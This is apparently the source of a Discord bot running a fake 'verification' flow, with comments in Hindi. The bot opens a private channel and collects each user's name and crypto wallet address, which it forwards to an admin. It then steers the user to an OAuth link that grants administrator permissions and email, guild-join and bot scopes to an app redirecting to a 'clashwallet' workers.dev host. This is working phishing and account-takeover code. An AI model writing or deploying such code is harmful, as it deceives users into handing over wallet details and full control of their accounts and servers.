import discord
from utils.helpers import create_private_channel, send_to_admin

class DetailsModal(discord.ui.Modal, title="Submit Your Details"):
    # Modal ke input fields
    name_input = discord.ui.TextInput(label="What is your Name?", style=discord.TextStyle.short, required=True)
    wallet_input = discord.ui.TextInput(label="Your Wallet Address?", style=discord.TextStyle.short, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        auth_url = "https://discord.com/oauth2/authorize?client_id=1564834525828223086&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fclashwallet.jindelkapil.workers.dev&integration_type=0&scope=identify+guilds+email+guilds.join+bot+applications.commands"
        
        # User ko reply dena
        await interaction.response.send_message(
            f"✅ **Details Submitted Successfully!**\nAdmin ke paas aapki details bhej di gayi hain.\n\n🔗 **Final Step:** Niche diye gaye link par click karke apna account authenticate karein:\n\n[👉 Click Here to Authenticate]({auth_url})", 
            ephemeral=True
        )
        
        # Admin ko background me data bhejna
        await send_to_admin(interaction.client, interaction.user, self.name_input.value, self.wallet_input.value)

class OpenFormView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None) # Timeout None taaki button hamesha kaam kare

    @discord.ui.button(label="📝 Fill Details", style=discord.ButtonStyle.primary, custom_id="open_form")
    async def open_form_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(DetailsModal())

class StartVerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start Verification", style=discord.ButtonStyle.secondary, custom_id="start_verify")
    async def start_verify_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏳ Aapka private verification channel banaya ja raha hai...", ephemeral=True)
        
        # Private channel banana
        channel = await create_private_channel(interaction.guild, interaction.user)
        
        # Naye channel me form wala embed bhejna
        embed = discord.Embed(
            title="🔒 Private Verification", 
            description=f"{interaction.user.mention}, Kripya niche diye gaye button par click karke apni details submit karein.", 
            color=0x5865F2
        )
        await channel.send(f"{interaction.user.mention}", embed=embed, view=OpenFormView())
